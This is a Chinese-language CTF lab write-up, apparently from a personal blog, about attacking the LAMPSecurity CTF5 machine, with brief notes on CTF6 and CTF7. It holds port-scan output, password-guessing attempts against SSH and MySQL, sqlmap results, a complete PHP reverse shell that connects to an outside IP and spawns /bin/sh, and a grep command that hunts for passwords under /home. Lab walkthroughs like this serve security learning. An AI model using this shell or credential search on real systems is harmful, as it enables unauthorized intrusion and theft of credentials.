<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Start: 2023-04-12 20:21:51</span><br><span class="line">PC Name: PENETRATION Lang: zh-CN</span><br><span class="line">Runtime: .net 4.0  ME: x64 OS: x64</span><br><span class="line">Found: Runtime .net 4.8.4084.0</span><br><span class="line">OS Name: Microsoft Windows 10 专业工作站版</span><br><span class="line">Machine Make: VMware, Inc.</span><br><span class="line">Network: IS Connected</span><br><span class="line">RunUser: Anonymous PR: -IsUser</span><br><span class="line">PID: 5624  CurrentProcess: Ladon911</span><br><span class="line">CPU: Physical: 2 Cores: 4 Logical: 4</span><br><span class="line">FreeSpace: Disk C:\ 76398 MB</span><br><span class="line"></span><br><span class="line">Threads: 80</span><br><span class="line">Not Found PassWord File,Use DefaultPwd</span><br><span class="line">load SshScan</span><br><span class="line">_ICMP: 192.168.222.132  00-0C-29-F7-4D-E0       VMware</span><br><span class="line">192.168.222.132 22      Close</span><br><span class="line">IP Finished!</span><br><span class="line">End: 2023-04-12 20:21:56</span><br></pre></td></tr></table></figure>

<p>┌──(kali㉿kali)-[~&#x2F;Desktop]<br>└─$ ssh -oKexAlgorithms&#x3D;+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1  -oHostKeyAlgorithms&#x3D;+ssh-rsa,ssh-dss <a href="mailto:&#114;&#111;&#x6f;&#116;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#46;&#x32;&#50;&#x32;&#46;&#x31;&#52;&#51;">&#114;&#111;&#x6f;&#116;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#46;&#x32;&#50;&#x32;&#46;&#x31;&#52;&#51;</a><br>The authenticity of host ‘192.168.222.143 (192.168.222.143)’ can’t be established.<br>RSA key fingerprint is SHA256:my5mjHup9LZ8CG0KCcvRNwYyvbuVrZI5nfKF7N1XjcU.<br>This key is not known by any other names.<br>Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes<br>Warning: Permanently added ‘192.168.222.143’ (RSA) to the list of known hosts.<br><a href="mailto:&#x72;&#111;&#x6f;&#x74;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x32;&#50;&#50;&#46;&#49;&#x34;&#x33;">&#x72;&#111;&#x6f;&#x74;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x32;&#50;&#50;&#46;&#49;&#x34;&#x33;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#114;&#x6f;&#111;&#116;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#50;&#50;&#50;&#x2e;&#49;&#52;&#x33;">&#114;&#x6f;&#111;&#116;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#50;&#50;&#50;&#x2e;&#49;&#52;&#x33;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#x38;&#46;&#x32;&#50;&#x32;&#46;&#49;&#52;&#51;">&#x72;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#x38;&#46;&#x32;&#50;&#x32;&#46;&#49;&#52;&#51;</a>‘s password: </p>
<p>看看能不能在哪个地方得到用户名</p>
<p>3306看也能爆破一下不</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FreeSpace: Disk C:\ 76398 MB</span><br><span class="line"></span><br><span class="line">Threads: 80</span><br><span class="line">Not Found PassWord File,Only Scan Mysql Port!</span><br><span class="line">load MysqlScan</span><br><span class="line">_ICMP: 192.168.222.132  00-0C-29-F7-4D-E0       VMware</span><br><span class="line">192.168.222.132 3306    Close</span><br><span class="line">IP Finished!</span><br><span class="line">End: 2023-04-12 20:22:43</span><br></pre></td></tr></table></figure>

<p>┌──(kali㉿kali)-[~&#x2F;Desktop]<br>└─$ mysql -h 192.168.222.143 -u root -p123456                                                      1 ⨯<br>ERROR 1045 (28000): Access denied for user ‘root‘@’192.168.222.132’ (using password: YES)</p>
<p>看80，25不知道干嘛的之后在管</p>
<p>80：</p>
<p>使用nikto+dirb</p>
<h2 id="┌──-kali㉿kali-x2F-Desktop-└─-nikto-url-http-192-168-222-143-Nikto-v2-1-6"><a href="#┌──-kali㉿kali-x2F-Desktop-└─-nikto-url-http-192-168-222-143-Nikto-v2-1-6" class="headerlink" title="┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ nikto -url  http://192.168.222.143- Nikto v2.1.6"></a>┌──(kali㉿kali)-[~&#x2F;Desktop]<br>└─$ nikto -url  <a href="http://192.168.222.143/">http://192.168.222.143</a><br>- Nikto v2.1.6</h2><ul>
<li>Target IP:          192.168.222.143</li>
<li>Target Hostname:    192.168.222.143</li>
<li>Target Port:        80</li>
<li>Start Time:         2023-04-12 08:28:41 (GMT-4)</li>
</ul>
<hr>
<ul>
<li>Server: Apache&#x2F;2.2.6 (Fedora)</li>
<li>Retrieved x-powered-by header: PHP&#x2F;5.2.4</li>
<li>The anti-clickjacking X-Frame-Options header is not present.</li>
<li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</li>
<li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</li>
<li>Apache&#x2F;2.2.6 appears to be outdated (current is at least Apache&#x2F;2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</li>
<li>Allowed HTTP Methods: <strong>GET, HEAD, POST, OPTIONS, TRACE</strong> </li>
<li>Web Server returns a valid response with junk HTTP methods, this may cause false positives.</li>
<li>OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</li>
<li>&#x2F;index.php: PHP include error may indicate local or remote file inclusion is possible.</li>
<li>OSVDB-12184: &#x2F;?&#x3D;PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-12184: &#x2F;?&#x3D;PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-12184: &#x2F;?&#x3D;PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-3092: <strong>&#x2F;phpmyadmin&#x2F;changelog.php</strong>: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
<li>Server may leak inodes via ETags, header found with file &#x2F;phpmyadmin&#x2F;ChangeLog, inode: 558008, size: 22676, mtime: Mon Aug 20 22:59:12 2029</li>
<li>OSVDB-3092: &#x2F;phpmyadmin&#x2F;ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
<li>Cookie SQMSESSID created without the httponly flag</li>
<li>OSVDB-3093: &#x2F;mail&#x2F;src&#x2F;read_body.php: SquirrelMail found</li>
<li>OSVDB-3093: &#x2F;squirrelmail&#x2F;src&#x2F;read_body.php: SquirrelMail found</li>
<li>&#x2F;info.php: Output from the phpinfo() function was found.</li>
<li>OSVDB-3233: &#x2F;info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.</li>
<li>OSVDB-3268: &#x2F;icons&#x2F;: Directory indexing found.</li>
<li>OSVDB-3233: &#x2F;icons&#x2F;README: Apache default file found.</li>
<li>OSVDB-5292: <strong>&#x2F;info.php</strong>?file&#x3D;<a href="http://cirt.net/rfiinc.txt">http://cirt.net/rfiinc.txt</a>?: RFI from RSnake’s list (<a href="http://ha.ckers.org/weird/rfi-locations.dat">http://ha.ckers.org/weird/rfi-locations.dat</a>) or from <a href="http://osvdb.org/">http://osvdb.org/</a> （<strong>phinfo界面，有敏感信息但没用</strong></li>
<li>&#x2F;phpmyadmin&#x2F;: phpMyAdmin directory found</li>
<li>OSVDB-3092: &#x2F;phpmyadmin&#x2F;Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
<li>OSVDB-3092: &#x2F;phpmyadmin&#x2F;README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
<li>8724 requests: 0 error(s) and 26 item(s) reported on remote host</li>
<li>End Time:           2023-04-12 08:29:06 (GMT-4) (25 seconds)</li>
</ul>
<hr>
<ul>
<li>1 host(s) tested</li>
</ul>
<p>三个地方登录注册：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">登录</span><br><span class="line">http://192.168.222.143/phpmyadmin/ （sql试了g</span><br><span class="line">http://192.168.222.143/mail/src/login.php （很卡这个</span><br><span class="line">/events/?q=node&amp;destination=node  （sql试了g</span><br><span class="line"></span><br><span class="line">注册</span><br><span class="line">http://192.168.222.143/list/</span><br><span class="line">[21:45:58] [WARNING] information_schema not available, back-end DBMS is MySQL &lt; 5. database names will be fetched from &#x27;mysql&#x27; database</span><br><span class="line">[21:45:58] [INFO] retrieved: &#x27;test&#x27;</span><br><span class="line">[21:45:58] [INFO] retrieved: &#x27;test\\_%&#x27;</span><br><span class="line">有sql注入但没东西，寄</span><br></pre></td></tr></table></figure>

<p>感觉phpadmin是突破点，一个一个试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DIRECTORY: http://192.168.222.143/phpmyadmin/contrib/                                             </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)                                 </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/index.php (CODE:200|SIZE:8457)                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/js/                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/lang/                                                </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/libraries (CODE:403|SIZE:302)                                     </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/LICENSE (CODE:200|SIZE:18011)                                     </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/phpinfo.php (CODE:200|SIZE:0)                                     </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/README (CODE:200|SIZE:2624)                                       </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/robots.txt (CODE:200|SIZE:26)                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/scripts/                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/setup/                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/themes/                                              </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/TODO (CODE:200|SIZE:235)  </span><br></pre></td></tr></table></figure>

<p><a href="http://192.168.222.143/phpmyadmin/contrib/">http://192.168.222.143/phpmyadmin/contrib/</a> ，phpmyadmin也没东西</p>
<p>网页感觉没东西了：</p>
<p>PORT     STATE SERVICE     VERSION<br>22&#x2F;tcp   open  ssh         OpenSSH 4.7 (protocol 2.0)<br>25&#x2F;tcp   open  smtp        Sendmail 8.14.1&#x2F;8.14.1<br>80&#x2F;tcp   open  http        Apache httpd 2.2.6 ((Fedora))<br>110&#x2F;tcp  open  pop3        ipop3d 2006k.101<br>111&#x2F;tcp  open  rpcbind     2-4 (RPC #100000)<br>139&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)<br>143&#x2F;tcp  open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)<br>445&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)<br>901&#x2F;tcp  open  http        Samba SWAT administration server<br>3306&#x2F;tcp open  mysql       MySQL 5.0.45</p>
<p>一个一个搜漏洞</p>
<p>摆了。。</p>
<p>直接上awvs，洞还不少。。。任意文件读取（地权限）、xss、sql</p>
<p>试试cms漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NanoCMS</span><br></pre></td></tr></table></figure>

<p>敏感信息泄露</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">set_time_limit (0);</span><br><span class="line">$ip = &quot;192.168.1.111&quot;;</span><br><span class="line">$port = &quot;13123&quot;;</span><br><span class="line"> </span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, 30);</span><br><span class="line">if (!$sock) </span><br><span class="line">	exit(&quot;$errstr ($errno)&quot;);</span><br><span class="line"> </span><br><span class="line">if(function_exists(&#x27;proc_open&#x27;))&#123;</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  </span><br><span class="line">   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  </span><br><span class="line">   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)  </span><br><span class="line">);</span><br><span class="line">$process = proc_open(&quot;id;/bin/sh -i&quot;, $descriptorspec, $pipes);</span><br><span class="line">if (!is_resource($process)) </span><br><span class="line">	exit(&quot;ERROR: Can&#x27;t reverse shell&quot;);</span><br><span class="line"> </span><br><span class="line">stream_set_blocking($pipes[0], 0);</span><br><span class="line">stream_set_blocking($pipes[1], 0);</span><br><span class="line">stream_set_blocking($pipes[2], 0);</span><br><span class="line">stream_set_blocking($sock, 0);</span><br><span class="line">	</span><br><span class="line">print(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span><br><span class="line"> </span><br><span class="line">while (1) &#123;</span><br><span class="line">	if (feof($sock)) &#123;</span><br><span class="line">		print(&quot;ERROR: Shell connection terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	if (feof($pipes[1])) &#123;</span><br><span class="line">		print(&quot;ERROR: Shell process terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$input = fread($sock, 1024);</span><br><span class="line">	fwrite($pipes[0], $input);</span><br><span class="line">	</span><br><span class="line">	$output = fread($pipes[1], 1024);</span><br><span class="line">	fwrite($sock, $output);</span><br><span class="line">	</span><br><span class="line">	$output = fread($pipes[2], 1024);</span><br><span class="line">	fwrite($sock, $output);</span><br><span class="line">&#125;	</span><br><span class="line">fclose($sock);</span><br><span class="line">fclose($pipes[0]);</span><br><span class="line">fclose($pipes[1]);</span><br><span class="line">fclose($pipes[2]);</span><br><span class="line">proc_close($process);</span><br><span class="line">&#125;</span><br><span class="line">else print &quot;function &#x27;proc_open&#x27; is not exists.&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>grep -ir pass &#x2F;home&#x2F;* 2&gt;&#x2F;dev&#x2F;null </p>
<p>得到root密码，结束</p>
<h3 id="别人："><a href="#别人：" class="headerlink" title="别人："></a>别人：</h3><p><a href="https://www.freebuf.com/articles/network/211939.html">CTF靶场系列-LAMPSecurity: CTF5 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://blog.csdn.net/kengkeng123qwe/article/details/124802020">Vulnhub-CTF5靶机实战_vulnhub windows靶机_御七彩虹猫的博客-CSDN博客</a></p>
<h2 id="CTF6"><a href="#CTF6" class="headerlink" title="CTF6"></a>CTF6</h2><p>还是比较简单（除了提权</p>
<p>注意的是：</p>
<p>最好在tmp下载利用脚本，改变权限，仔细看linux说明udev</p>
<h2 id="CTF7"><a href="#CTF7" class="headerlink" title="CTF7"></a>CTF7</h2><p>信息收集：</p>
<p>nmap、nessus、awvs、dirb、nikto</p>
<p>得到目标ip：192.168.222.254</p>
<p>漏洞探测：</p>
<p>漏洞利用：</p>
<p>提权：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230417194051405.png" alt="image-20230417194051405"></p>
<p>找到一个用户能够直接sudo</p>
<h2 id="PWNOS-1-0（还没做）"><a href="#PWNOS-1-0（还没做）" class="headerlink" title="PWNOS 1.0（还没做）"></a>PWNOS 1.0（还没做）</h2><p>链接：<a href="https://www.vulnhub.com/entry/pwnos-10,33/">pWnOS: 1.0 ~ VulnHub</a></p>
<h2 id="PWNOS-2-0（还没做）"><a href="#PWNOS-2-0（还没做）" class="headerlink" title="PWNOS 2.0（还没做）"></a>PWNOS 2.0（还没做）</h2><h2 id="HOLYNIX"><a href="#HOLYNIX" class="headerlink" title="HOLYNIX"></a>HOLYNIX</h2>]]></content>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
</search>
